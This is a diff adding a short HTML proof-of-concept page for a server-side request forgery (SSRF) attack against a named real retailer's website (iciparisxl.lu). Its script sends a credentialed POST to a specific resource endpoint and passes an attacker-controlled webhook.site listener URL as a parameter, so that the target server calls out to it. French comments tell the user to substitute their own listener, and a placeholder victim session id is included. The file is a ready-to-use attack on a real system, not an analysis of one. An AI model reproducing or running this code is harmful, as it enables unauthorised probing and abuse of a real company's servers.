@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF PoC – ICI PARIS XL</title>
+</head>
+<body>
+    <script>
+        const endpoint = "https://www.iciparisxl.lu/resources/1ade93f5d8f005313236463468176aaaad1001495f588/ah";
+        const yourListener = "https://webhook.site/abc123"; // ← remplacez par votre URL
+
+        const params = new URLSearchParams({
+            a: "1701637501",
+            b: "victime-session-id",  // peut être fixe ou aléatoire
+            ss: "2",
+            c: "63468176aaaad1001495f588",
+            d: "0",
+            r: "isNT2k60NIzS0utL",
+            u: yourListener,          // l'URL qui sera appelée par le serveur
+            h: "1772332740",
+            s: "1",
+            sp: "false",
+            pp: "false",
+            t: Date.now(),
+            sm: "1",
+            tr: "1"
+        });
+
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", endpoint + "?" + params.toString(), true);
+        xhr.withCredentials = true;
+        xhr.setRequestHeader("Content-Type", "text/plain");
+        xhr.send("ssrf"); // corps minimal
+    </script>
+</body>
+</html>
